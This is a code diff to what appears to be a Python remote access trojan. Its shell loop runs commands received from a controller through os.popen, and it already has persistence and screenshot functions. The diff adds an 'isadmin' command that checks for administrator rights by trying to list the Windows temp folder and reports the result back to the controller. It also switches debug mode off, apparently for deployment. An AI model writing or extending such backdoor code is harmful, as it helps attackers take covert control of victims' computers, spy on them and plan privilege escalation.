@@ -48,6 +48,8 @@ def shell():
             persistence()
         elif cmd.startswith("screenshot"):
             screenshot()
+        elif cmd.startswith("isadmin"):
+            is_admin()
         else:
             try:
                 proc = os.popen(cmd)  # open a process to run commands on shell
@@ -177,8 +179,22 @@ def image_open():
             print(e)
 
 
+def is_admin():
+    """
+    Check if current user has admin privileges trying reading Windows folder
+    :return:
+    """
+    try:
+        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
+        reliable_send("Host has Administrative privileges")
+        return True
+    except:
+        reliable_send("Host has User privileges")
+        return False
+
+
 if __name__ == '__main__':
     global debug
-    debug = True
+    debug = False
     client()
     shell()
